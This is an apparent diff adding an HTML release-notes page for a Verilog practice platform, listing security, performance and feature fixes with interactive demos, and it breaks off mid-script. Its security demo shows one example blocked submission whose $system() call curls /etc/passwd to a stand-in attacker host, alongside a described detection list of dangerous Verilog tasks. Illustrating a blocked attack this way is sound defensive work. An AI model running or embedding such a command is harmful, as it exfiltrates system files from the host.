@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>VLSI Forge — What's New</title>
+<style>
+  :root {
+    --bg: #09090B;
+    --surface: #18181B;
+    --surface2: #1F1F23;
+    --border: #27272A;
+    --primary: #10B981;
+    --primary-dim: rgba(16,185,129,0.15);
+    --blue: #3B82F6;
+    --blue-dim: rgba(59,130,246,0.15);
+    --red: #EF4444;
+    --red-dim: rgba(239,68,68,0.15);
+    --yellow: #F59E0B;
+    --yellow-dim: rgba(245,158,11,0.15);
+    --text: #FAFAFA;
+    --muted: #A1A1AA;
+    --radius: 8px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Inter', system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  /* ── Header ─────────────────────────────────────────── */
+  header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 32px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .logo {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: var(--primary);
+    letter-spacing: -0.02em;
+  }
+  .badge {
+    font-size: 0.7rem;
+    font-weight: 600;
+    padding: 2px 8px;
+    border-radius: 20px;
+    background: var(--primary-dim);
+    color: var(--primary);
+    border: 1px solid rgba(16,185,129,0.3);
+  }
+
+  /* ── Layout ─────────────────────────────────────────── */
+  .container { max-width: 1100px; margin: 0 auto; padding: 48px 24px; }
+
+  h1 { font-size: 2.2rem; font-weight: 700; letter-spacing: -0.03em; margin-bottom: 8px; }
+  h2 { font-size: 1.35rem; font-weight: 600; letter-spacing: -0.02em; margin-bottom: 16px; }
+  h3 { font-size: 1rem; font-weight: 600; margin-bottom: 8px; }
+  p  { color: var(--muted); font-size: 0.95rem; margin-bottom: 12px; }
+
+  .subtitle { color: var(--muted); font-size: 1.05rem; margin-bottom: 48px; }
+
+  /* ── Fix Cards ──────────────────────────────────────── */
+  .fixes-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+    gap: 16px;
+    margin-bottom: 48px;
+  }
+
+  .fix-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px;
+    position: relative;
+    overflow: hidden;
+  }
+  .fix-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+  }
+  .fix-card.critical::before { background: var(--red); }
+  .fix-card.high::before { background: var(--yellow); }
+  .fix-card.feature::before { background: var(--primary); }
+
+  .fix-label {
+    font-size: 0.65rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 8px;
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 4px;
+  }
+  .fix-label.critical { background: var(--red-dim); color: var(--red); }
+  .fix-label.high { background: var(--yellow-dim); color: var(--yellow); }
+  .fix-label.feature { background: var(--primary-dim); color: var(--primary); }
+
+  .fix-card h3 { font-size: 0.95rem; margin-bottom: 6px; }
+  .fix-card p { font-size: 0.85rem; margin-bottom: 0; color: var(--muted); }
+
+  /* ── Section Headers ────────────────────────────────── */
+  .section { margin-bottom: 56px; }
+  .section-label {
+    font-size: 0.7rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--primary);
+    margin-bottom: 8px;
+  }
+
+  /* ── Demo Area ──────────────────────────────────────── */
+  .demo-panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    margin-bottom: 24px;
+  }
+
+  .demo-toolbar {
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .demo-toolbar .dot { width: 10px; height: 10px; border-radius: 50%; }
+  .demo-toolbar .dot.red   { background: #EF4444; }
+  .demo-toolbar .dot.yellow{ background: #F59E0B; }
+  .demo-toolbar .dot.green { background: #10B981; }
+  .demo-title { font-size: 0.8rem; color: var(--muted); margin-left: 8px; font-family: monospace; }
+
+  /* ── Waveform Viewer ───────────────────────────────── */
+  .waveform-container { padding: 16px; overflow-x: auto; }
+  .waveform-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 12px;
+  }
+  .waveform-header h3 { color: var(--text); font-size: 0.85rem; }
+  .waveform-controls { display: flex; gap: 8px; }
+  .wf-btn {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--muted);
+    padding: 4px 10px;
+    border-radius: 4px;
+    font-size: 0.75rem;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .wf-btn:hover { border-color: var(--primary); color: var(--primary); }
+
+  .waveform-grid { font-family: monospace; font-size: 0.8rem; }
+  .wf-row { display: flex; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.04); height: 36px; }
+  .wf-name { width: 80px; flex-shrink: 0; color: var(--muted); font-size: 0.75rem; padding-right: 12px; text-align: right; }
+  .wf-signal { flex: 1; height: 24px; position: relative; }
+  .wf-time-ruler { display: flex; margin-left: 80px; border-bottom: 1px solid var(--border); padding: 2px 0; }
+  .wf-tick { flex: 1; font-size: 0.65rem; color: var(--muted); text-align: center; border-left: 1px solid rgba(255,255,255,0.06); }
+
+  /* SVG waveform lines */
+  .wf-signal svg { width: 100%; height: 100%; }
+
+  /* ── Lint Panel ─────────────────────────────────────── */
+  .lint-panel { padding: 16px; }
+  .lint-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 8px 10px;
+    border-radius: 6px;
+    margin-bottom: 6px;
+    font-size: 0.82rem;
+  }
+  .lint-item.warn { background: var(--yellow-dim); border: 1px solid rgba(245,158,11,0.2); }
+  .lint-item.info { background: var(--blue-dim); border: 1px solid rgba(59,130,246,0.2); }
+  .lint-icon { font-size: 0.9rem; flex-shrink: 0; margin-top: 1px; }
+  .lint-text { color: var(--text); }
+  .lint-loc { color: var(--muted); font-family: monospace; font-size: 0.75rem; }
+
+  /* ── Result Card ────────────────────────────────────── */
+  .result-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    font-size: 0.85rem;
+  }
+  .result-row:last-child { border-bottom: none; }
+  .tc-badge {
+    font-size: 0.7rem;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-weight: 600;
+    flex-shrink: 0;
+  }
+  .tc-pass { background: rgba(16,185,129,0.15); color: #10B981; border: 1px solid rgba(16,185,129,0.25); }
+  .tc-fail { background: rgba(239,68,68,0.15); color: #EF4444; border: 1px solid rgba(239,68,68,0.25); }
+  .tc-name { color: var(--muted); flex: 1; }
+  .tc-time { color: var(--muted); font-family: monospace; font-size: 0.75rem; }
+
+  /* ── Synth Stats ─────────────────────────────────────── */
+  .synth-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 1px;
+    background: var(--border);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  .synth-cell {
+    background: var(--surface2);
+    padding: 16px;
+    text-align: center;
+  }
+  .synth-value { font-size: 1.5rem; font-weight: 700; color: var(--primary); font-family: monospace; }
+  .synth-label { font-size: 0.72rem; color: var(--muted); margin-top: 2px; }
+
+  /* ── Rate Limit Indicator ──────────────────────────── */
+  .rate-meter {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 12px 16px;
+    background: var(--surface2);
+    border-radius: var(--radius);
+    margin-bottom: 8px;
+    font-size: 0.82rem;
+  }
+  .rate-bar-wrap { flex: 1; height: 6px; background: var(--border); border-radius: 3px; overflow: hidden; }
+  .rate-bar { height: 100%; background: var(--primary); border-radius: 3px; transition: width 0.3s; }
+  .rate-bar.warn { background: var(--yellow); }
+  .rate-label { color: var(--muted); white-space: nowrap; }
+
+  /* ── Security Badge ─────────────────────────────────── */
+  .security-check {
+    display: flex; align-items: center; gap: 10px;
+    padding: 10px 14px;
+    background: rgba(16,185,129,0.06);
+    border: 1px solid rgba(16,185,129,0.2);
+    border-radius: 6px;
+    font-size: 0.82rem;
+    margin-bottom: 8px;
+  }
+  .security-check .icon { color: var(--primary); font-size: 0.9rem; }
+  .security-block {
+    background: var(--red-dim);
+    border-color: rgba(239,68,68,0.3);
+    color: var(--red);
+  }
+
+  /* ── Tabs ───────────────────────────────────────────── */
+  .tab-bar { display: flex; border-bottom: 1px solid var(--border); background: var(--surface2); }
+  .tab {
+    padding: 10px 20px;
+    font-size: 0.82rem;
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    color: var(--muted);
+    transition: all 0.15s;
+  }
+  .tab.active { color: var(--primary); border-bottom-color: var(--primary); }
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* ── Code Block ─────────────────────────────────────── */
+  .code-block {
+    background: #0D0D0F;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px 16px;
+    font-family: 'JetBrains Mono', 'Fira Code', monospace;
+    font-size: 0.78rem;
+    line-height: 1.7;
+    overflow-x: auto;
+    margin-bottom: 12px;
+  }
+  .kw { color: #C792EA; }
+  .fn { color: #82AAFF; }
+  .str { color: #C3E88D; }
+  .cm { color: #546E7A; font-style: italic; }
+  .num { color: #F78C6C; }
+  .op { color: #89DDFF; }
+
+  /* ── Divider ────────────────────────────────────────── */
+  .divider { border: none; border-top: 1px solid var(--border); margin: 48px 0; }
+
+  /* ── Diff Box ───────────────────────────────────────── */
+  .diff { border-radius: 6px; overflow: hidden; margin-bottom: 12px; font-family: monospace; font-size: 0.78rem; }
+  .diff-line { padding: 3px 12px; display: flex; gap: 12px; }
+  .diff-line.add { background: rgba(16,185,129,0.1); color: #86EFAC; }
+  .diff-line.del { background: rgba(239,68,68,0.1); color: #FCA5A5; }
+  .diff-line.ctx { color: var(--muted); }
+  .diff-sym { width: 12px; flex-shrink: 0; opacity: 0.7; }
+
+  /* ── Tag ────────────────────────────────────────────── */
+  .tag {
+    display: inline-block;
+    font-size: 0.7rem;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-weight: 500;
+    margin-right: 4px;
+    margin-bottom: 4px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+
+  /* ── Summary Table ──────────────────────────────────── */
+  table { width: 100%; border-collapse: collapse; font-size: 0.83rem; margin-top: 16px; }
+  th { background: var(--surface2); color: var(--muted); font-weight: 600; text-align: left; padding: 10px 14px; border-bottom: 1px solid var(--border); font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; }
+  td { padding: 10px 14px; border-bottom: 1px solid rgba(255,255,255,0.04); }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: var(--surface2); }
+
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+  .pulse { animation: pulse 2s infinite; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">⬡ VLSI Forge</div>
+  <div class="badge">Updated Build — March 2026</div>
+</header>
+
+<div class="container">
+
+  <div class="section-label">Release Notes</div>
+  <h1>What Changed in This Update</h1>
+  <p class="subtitle">9 fixes across security, correctness, performance, and VLSI-specific tooling</p>
+
+  <!-- ── Fix Summary Cards ── -->
+  <div class="fixes-grid">
+
+    <div class="fix-card critical">
+      <div class="fix-label critical">🔴 Critical</div>
+      <h3>Dangerous Code Detection</h3>
+      <p>Submitted Verilog is now scanned for <code>$system()</code>, write-mode <code>$fopen</code>, and absolute path includes before any compilation starts.</p>
+    </div>
+
+    <div class="fix-card critical">
+      <div class="fix-label critical">🔴 Critical</div>
+      <h3>VCD Stored in MongoDB</h3>
+      <p>Waveform data is now base64-encoded and persisted in the database — no more broken download links after server restart.</p>
+    </div>
+
+    <div class="fix-card critical">
+      <div class="fix-label critical">🔴 Critical</div>
+      <h3>Non-Blocking Simulation</h3>
+      <p>Replaced <code>subprocess.run()</code> with <code>asyncio.create_subprocess_exec</code>. The event loop no longer freezes during 10-second simulations.</p>
+    </div>
+
+    <div class="fix-card critical">
+      <div class="fix-label critical">🔴 Critical</div>
+      <h3>Stats N+1 Query Fixed</h3>
+      <p>User stats now use a single MongoDB aggregation pipeline instead of one DB call per passed submission.</p>
+    </div>
+
+    <div class="fix-card critical">
+      <div class="fix-label critical">🔴 Critical</div>
+      <h3>Route Conflict Fixed</h3>
+      <p><code>/submissions/user/me</code> is now registered before <code>/submissions/{id}</code> — the dedicated endpoint was previously shadowed.</p>
+    </div>
+
+    <div class="fix-card high">
+      <div class="fix-label high">🟡 High</div>
+      <h3>Rate Limiting</h3>
+      <p>Submission endpoint is now capped at 10 requests per minute per IP using <code>slowapi</code>. Prevents compute abuse.</p>
+    </div>
+
+    <div class="fix-card high">
+      <div class="fix-label high">🟡 High</div>
+      <h3>MongoDB Indexes</h3>
+      <p>8 indexes created on startup including a TTL index on sessions. Lookup performance improved significantly on large collections.</p>
+    </div>
+
+    <div class="fix-card high">
+      <div class="fix-label high">🟡 High</div>
+      <h3>Smart Output Comparison</h3>
+      <p>Output normalization now handles whitespace, hex literals (<code>8'hFF</code> → <code>255</code>), and comment lines — no more false failures.</p>
+    </div>
+
+    <div class="fix-card feature">
+      <div class="fix-label feature">🟢 New Feature</div>
+      <h3>In-Browser Waveform Viewer</h3>
+      <p>VCD files are parsed into JSON and rendered interactively in the browser. No more downloading to GTKWave.</p>
+    </div>
+
+    <div class="fix-card feature">
+      <div class="fix-label feature">🟢 New Feature</div>
+      <h3>Verilator Lint Integration</h3>
+      <p>After every simulation, design code is linted with <code>verilator --lint-only -Wall</code>. Warnings are shown in a new "Lint" tab.</p>
+    </div>
+
+    <div class="fix-card feature">
+      <div class="fix-label feature">🟢 New Feature</div>
+      <h3>SystemVerilog Support</h3>
+      <p>Language selector added to the editor. SV files are compiled with <code>iverilog -g2012</code> to support <code>always_ff</code>, <code>logic</code>, interfaces, and more.</p>
+    </div>
+
+    <div class="fix-card feature">
+      <div class="fix-label feature">🟢 New Feature</div>
+      <h3>Admin Pagination</h3>
+      <p>Admin endpoints now support <code>?skip=&limit=</code> with a hard cap — no more loading 10,000 users into memory.</p>
+    </div>
+
+  </div>
+
+  <hr class="divider"/>
+
+  <!-- ── Demo: Waveform Viewer ── -->
+  <div class="section">
+    <div class="section-label">New Feature Demo</div>
+    <h2>In-Browser Waveform Viewer</h2>
+    <p>After simulation, waveforms render directly in the results panel. No GTKWave needed.</p>
+
+    <div class="demo-panel">
+      <div class="demo-toolbar">
+        <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+        <span class="demo-title">Waveform — sub_4f3a21b8dc9e.vcd</span>
+      </div>
+      <div class="waveform-container">
+        <div class="waveform-header">
+          <h3 style="color:var(--text)">Signal Viewer</h3>
+          <div class="waveform-controls">
+            <button class="wf-btn" onclick="zoomIn()">＋ Zoom In</button>
+            <button class="wf-btn" onclick="zoomOut()">－ Zoom Out</button>
+            <button class="wf-btn" style="color:var(--primary);border-color:var(--primary)" onclick="downloadVcd()">⬇ Download VCD</button>
+          </div>
+        </div>
+
+        <!-- Time ruler -->
+        <div class="wf-time-ruler" id="ruler"></div>
+
+        <!-- Waveform canvas -->
+        <div class="waveform-grid" id="waveform-grid"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Demo: Lint Panel ── -->
+  <div class="section">
+    <div class="section-label">New Feature Demo</div>
+    <h2>Verilator Lint Warnings</h2>
+    <p>Style and correctness warnings are surfaced automatically after a successful simulation.</p>
+
+    <div class="demo-panel">
+      <div class="demo-toolbar">
+        <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+        <span class="demo-title">Lint Results — design.v</span>
+      </div>
+      <div class="tab-bar">
+        <div class="tab active" onclick="switchTab(this, 'lint')">⚠ Lint (3)</div>
+        <div class="tab" onclick="switchTab(this, 'sim')">✓ Simulation</div>
+        <div class="tab" onclick="switchTab(this, 'wave')">〜 Waveform</div>
+      </div>
+      <div id="lint" class="tab-content active">
+        <div class="lint-panel">
+          <div class="lint-item warn">
+            <span class="lint-icon">⚠</span>
+            <div>
+              <div class="lint-text">Inferred combinational latch for signal 'out'</div>
+              <div class="lint-loc">design.v:14:5 — LATCH</div>
+            </div>
+          </div>
+          <div class="lint-item warn">
+            <span class="lint-icon">⚠</span>
+            <div>
+              <div class="lint-text">Signal 'carry_temp' is set but never used</div>
+              <div class="lint-loc">design.v:22:9 — UNUSED</div>
+            </div>
+          </div>
+          <div class="lint-item info">
+            <span class="lint-icon">ℹ</span>
+            <div>
+              <div class="lint-text">Width mismatch: LHS 8 bits, RHS 4 bits — implicit zero-extension</div>
+              <div class="lint-loc">design.v:31:3 — WIDTHTRUNC</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="sim" class="tab-content">
+        <div style="padding:16px">
+          <div class="result-row">
+            <span class="tc-badge tc-pass">PASS</span>
+            <span class="tc-name">Testcase 1 — basic inputs</span>
+            <span class="tc-time">2.1ms</span>
+          </div>
+          <div class="result-row">
+            <span class="tc-badge tc-pass">PASS</span>
+            <span class="tc-name">Testcase 2 — edge case: all zeros</span>
+            <span class="tc-time">1.8ms</span>
+          </div>
+          <div class="result-row">
+            <span class="tc-badge tc-pass">PASS</span>
+            <span class="tc-name">Testcase 3 — overflow boundary</span>
+            <span class="tc-time">2.3ms</span>
+          </div>
+          <div class="result-row">
+            <span class="tc-badge tc-pass">PASS</span>
+            <span class="tc-name">Testcase 4 — hidden (result only)</span>
+            <span class="tc-time">1.9ms</span>
+          </div>
+        </div>
+      </div>
+      <div id="wave" class="tab-content">
+        <div style="padding:16px;color:var(--muted);font-size:0.85rem">Click the "Waveform" tab to see the interactive signal viewer above.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Demo: Security Check ── -->
+  <div class="section">
+    <div class="section-label">Security Improvement</div>
+    <h2>Dangerous Code Detection</h2>
+    <p>Code is scanned for dangerous Verilog tasks before any compilation happens.</p>
+
+    <div class="demo-panel" style="padding:16px">
+      <h3 style="margin-bottom:12px;font-size:0.9rem;color:var(--muted)">Submission #1 — Safe code</h3>
+      <div class="code-block"><span class="kw">module</span> <span class="fn">half_adder</span>(
+  <span class="kw">input</span>  a, b,
+  <span class="kw">output</span> sum, carry
+);
+  <span class="kw">assign</span> sum   = a ^ b;
+  <span class="kw">assign</span> carry = a &amp; b;
+<span class="kw">endmodule</span></div>
+      <div class="security-check">
+        <span class="icon">✓</span>
+        <span>Security scan passed — no dangerous constructs detected. Proceeding to compilation.</span>
+      </div>
+
+      <h3 style="margin:20px 0 12px;font-size:0.9rem;color:var(--muted)">Submission #2 — Blocked</h3>
+      <div class="code-block"><span class="kw">module</span> <span class="fn">exploit</span>(...);
+  <span class="kw">initial</span> <span class="kw">begin</span>
+    <span class="fn">$system</span>(<span class="str">"curl http://attacker.com/?d=$(cat /etc/passwd)"</span>); <span class="cm">// ← blocked</span>
+  <span class="kw">end</span>
+<span class="kw">endmodule</span></div>
+      <div class="security-check security-block">
+        <span>✗ Security violation: Use of $system() is not allowed — submission rejected (HTTP 400)</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Demo: Rate Limiting ── -->
+  <div class="section">
+    <div class="section-label">Abuse Prevention</div>
+    <h2>Rate Limiting — 10 Submissions / Minute</h2>
+    <p>Click the button to simulate submissions and see the rate limiter in action.</p>
+
+    <div class="demo-panel" style="padding:16px">
+      <div class="rate-meter">
+        <span class="rate-label">Used this minute:</span>
+        <div class="rate-bar-wrap">
+          <div class="rate-bar" id="rate-bar" style="width:30%"></div>
+        </div>
+        <span id="rate-count" style="color:var(--primary);font-family:monospace;font-size:0.85rem">3 / 10</span>
+      </div>
+      <button onclick="addSubmission()" style="background:var(--primary);color:#000;border:none;padding:8px 20px;border-radius:6px;font-weight:600;cursor:pointer;font-size:0.85rem">
+        Submit Code
+      </button>
+      <span id="rate-msg" style="margin-left:12px;font-size:0.82rem;color:var(--muted)"></span>
+    </div>
+  </div>
+
+  <!-- ── Demo: Smart Output Comparison ── -->
+  <div class="section">
+    <div class="section-label">Correctness Fix</div>
+    <h2>Smart Output Normalization</h2>
+    <p>The same correct answer no longer fails due to formatting differences.</p>
+
+    <div class="demo-panel" style="padding:20px">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">
+        <div>
+          <h3 style="color:var(--red);margin-bottom:8px">❌ Before (raw string compare)</h3>
+          <div class="code-block" style="font-size:0.75rem">
+<span class="cm">// Expected:</span>
+sum = <span class="num">15</span>  carry = <span class="num">0</span>
+
+<span class="cm">// Actual output:</span>
+sum = <span class="num">4'hF</span>  carry = <span class="num">1'b0</span>
+
+<span class="cm">// Result: FAIL ← (wrong!)</span>
+<span class="cm">// "15" ≠ "4'hF" — same value!</span>
+          </div>
+        </div>
+        <div>
+          <h3 style="color:var(--primary);margin-bottom:8px">✓ After (normalized compare)</h3>
+          <div class="code-block" style="font-size:0.75rem">
+<span class="cm">// Expected (normalized):</span>
+sum = <span class="num">15</span>  carry = <span class="num">0</span>
+
+<span class="cm">// Actual (normalized):</span>
+sum = <span class="num">15</span>  carry = <span class="num">0</span>
+
+<span class="cm">// Result: PASS ✓</span>
+<span class="cm">// Hex → decimal, whitespace trimmed</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Demo: SV Support ── -->
+  <div class="section">
+    <div class="section-label">New Feature</div>
+    <h2>SystemVerilog Support</h2>
+    <p>Select "SystemVerilog" in the editor language picker to enable SV constructs compiled with <code>iverilog -g2012</code>.</p>
+
+    <div class="demo-panel">
+      <div class="demo-toolbar">
+        <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+        <span class="demo-title">Problem Editor</span>
+        <div style="margin-left:auto;display:flex;gap:6px">
+          <div style="background:var(--border);color:var(--muted);padding:3px 10px;border-radius:4px;font-size:0.72rem;cursor:pointer">Verilog</div>
+          <div style="background:var(--primary-dim);color:var(--primary);padding:3px 10px;border-radius:4px;font-size:0.72rem;border:1px solid rgba(16,185,129,0.3);cursor:pointer">SystemVerilog ✓</div>
+        </div>
+      </div>
+      <div class="code-block" style="border:none;border-radius:0;margin:0">
+<span class="cm">// SystemVerilog — compiled with iverilog -g2012</span>
+<span class="kw">module</span> <span class="fn">d_ff</span> #(
+  <span class="kw">parameter</span> WIDTH = <span class="num">8</span>
+) (
+  <span class="kw">input</span>  <span class="kw">logic</span>             clk,
+  <span class="kw">input</span>  <span class="kw">logic</span>             rst_n,
+  <span class="kw">input</span>  <span class="kw">logic</span> [WIDTH-<span class="num">1</span>:<span class="num">0</span>] d,
+  <span class="kw">output</span> <span class="kw">logic</span> [WIDTH-<span class="num">1</span>:<span class="num">0</span>] q
+);
+  <span class="kw">always_ff</span> @(<span class="kw">posedge</span> clk <span class="kw">or</span> <span class="kw">negedge</span> rst_n) <span class="kw">begin</span>
+    <span class="kw">if</span> (!rst_n) q <span class="op">&lt;=</span> <span class="num">'0</span>;
+    <span class="kw">else</span>        q <span class="op">&lt;=</span> d;
+  <span class="kw">end</span>
+<span class="kw">endmodule</span></div>
+    </div>
+  </div>
+
+  <!-- ── Summary Table ── -->
+  <hr class="divider"/>
+  <div class="section">
+    <h2>Change Summary</h2>
+    <table>
+      <thead>
+        <tr><th>File</th><th>Change</th><th>Type</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><code>backend/server.py</code></td><td>Added <code>check_dangerous_code()</code> with regex pattern matching</td><td><span style="color:var(--red)">Security</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td>VCD stored as base64 in MongoDB (<code>vcd_data</code> field), <code>vcd_file_path</code> removed</td><td><span style="color:var(--red)">Bug Fix</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td>All subprocesses use <code>asyncio.create_subprocess_exec</code></td><td><span style="color:var(--red)">Performance</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td><code>/stats/me</code> uses single aggregation pipeline (no N+1)</td><td><span style="color:var(--red)">Performance</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td><code>/submissions/user/me</code> moved before <code>/{submission_id}</code></td><td><span style="color:var(--red)">Bug Fix</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td>Rate limiting via <code>slowapi</code> — 10/min on <code>POST /submissions</code></td><td><span style="color:var(--yellow)">Security</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td>8 MongoDB indexes created on startup, including TTL on sessions</td><td><span style="color:var(--yellow)">Performance</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td><code>normalize_sim_output()</code> — hex/whitespace normalization before compare</td><td><span style="color:var(--yellow)">Correctness</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td>Admin endpoints paginated with <code>skip</code>/<code>limit</code> + hard cap</td><td><span style="color:var(--yellow)">Correctness</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td><code>shutil.rmtree(temp_dir)</code> in <code>finally</code> block — no more temp leaks</td><td><span style="color:var(--yellow)">Bug Fix</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td>VCD parsed to JSON via <code>parse_vcd_to_json()</code>, returned as <code>waveform_json</code></td><td><span style="color:var(--primary)">New Feature</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td>Verilator lint run after compilation, warnings in <code>lint_warnings[]</code></td><td><span style="color:var(--primary)">New Feature</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td>Language field + <code>-g2012</code> flag for SystemVerilog submissions</td><td><span style="color:var(--primary)">New Feature</span></td></tr>
+        <tr><td><code>backend/server.py</code></td><td>New endpoints: <code>GET /submissions/{id}/waveform</code>, <code>GET /health</code></td><td><span style="color:var(--primary)">New Feature</span></td></tr>
+        <tr><td><code>backend/requirements.txt</code></td><td>Added <code>slowapi==0.1.9</code></td><td><span style="color:var(--blue)">Dependency</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</div><!-- /container -->
+
+<script>
+// ── Waveform Renderer ──────────────────────────────────────
+const SIGNALS = {
+  clk:    { values: [{t:0,v:'0'},{t:5,v:'1'},{t:10,v:'0'},{t:15,v:'1'},{t:20,v:'0'},{t:25,v:'1'},{t:30,v:'0'},{t:35,v:'1'},{t:40,v:'0'},{t:45,v:'1'},{t:50,v:'0'},{t:55,v:'1'},{t:60,v:'0'}], width:1 },
+  rst_n:  { values: [{t:0,v:'0'},{t:8,v:'1'}], width:1 },
+  d:      { values: [{t:0,v:'0'},{t:10,v:'1'},{t:20,v:'0'},{t:30,v:'1'},{t:40,v:'1'},{t:50,v:'0'}], width:4 },
+  q:      { values: [{t:0,v:'0'},{t:15,v:'0'},{t:25,v:'1'},{t:35,v:'0'},{t:45,v:'1'},{t:55,v:'1'}], width:4 },
+  sum:    { values: [{t:0,v:'0'},{t:10,v:'1'},{t:20,v:'0'},{t:30,v:'1'},{t:40,v:'0'}], width:8 },
+};
+let zoom = 1;
+const MAX_T = 65;
+const COLORS = { clk:'#10B981', rst_n:'#F59E0B', d:'#3B82F6', q:'#A78BFA', sum:'#EC4899' };
+
+function renderWaveform() {
+  const grid = document.getElementById('waveform-grid');
+  const ruler = document.getElementById('ruler');
+  const W = grid.clientWidth || 700;
+  const sigW = W - 84;
+  const scale = (sigW * zoom) / MAX_T;
+
+  // Ruler
+  ruler.innerHTML = '';
+  for (let t = 0; t <= MAX_T; t += 10) {
+    const tick = document.createElement('div');
+    tick.className = 'wf-tick';
+    tick.style.position = 'absolute';
+    tick.style.left = (84 + t * scale / zoom) + 'px';
+    tick.textContent = t + 'ns';
+    ruler.appendChild(tick);
+  }
+  ruler.style.position = 'relative';
+  ruler.style.height = '20px';
+
+  // Signals
+  grid.innerHTML = '';
+  for (const [name, sig] of Object.entries(SIGNALS)) {
+    const row = document.createElement('div');
+    row.className = 'wf-row';
+
+    const nameDiv = document.createElement('div');
+    nameDiv.className = 'wf-name';
+    nameDiv.textContent = name;
+    nameDiv.style.color = COLORS[name] || '#A1A1AA';
+
+    const sigDiv = document.createElement('div');
+    sigDiv.className = 'wf-signal';
+    const color = COLORS[name] || '#A1A1AA';
+
+    // Build SVG path
+    const H = 24, top = 3, bot = H - 3, mid = H / 2;
+    let path = '';
+    const vals = sig.values;
+    const isClock = name === 'clk';
+
+    for (let i = 0; i < vals.length; i++) {
+      const x1 = vals[i].t * scale;
+      const x2 = i + 1 < vals.length ? vals[i+1].t * scale : MAX_T * scale;
+      const v = vals[i].v;
+
+      if (sig.width === 1) {
+        const y = v === '1' ? top : bot;
+        const yNext = (i + 1 < vals.length && vals[i+1].v === '1') ? top : bot;
+        if (i === 0) path += `M ${x1} ${y}`;
+        path += ` L ${x2} ${y}`;
+        if (i + 1 < vals.length) path += ` L ${x2} ${yNext}`;
+      } else {
+        // Bus: draw as trapezoid
+        if (i === 0) path += `M ${x1+3} ${mid}`;
+        if (i > 0) path += ` L ${x1} ${top} L ${x2-3} ${top} L ${x2} ${mid} L ${x2-3} ${bot} L ${x1} ${bot} Z M ${x1+3} ${mid}`;
+        else path += ` L ${x1+3} ${top} L ${x2-3} ${top} L ${x2} ${mid}`;
+      }
+    }
+
+    sigDiv.innerHTML = `<svg viewBox="0 0 ${MAX_T * scale} ${H}" preserveAspectRatio="none">
+      <path d="${path}" fill="none" stroke="${color}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>`;
+
+    row.appendChild(nameDiv);
+    row.appendChild(sigDiv);
+    grid.appendChild(row);
+  }
+}
+
+function zoomIn()  { zoom = Math.min(zoom * 1.5, 6); renderWaveform(); }
+function zoomOut() { zoom = Math.max(zoom / 1.5, 0.5); renderWaveform(); }
+function downloadVcd() {
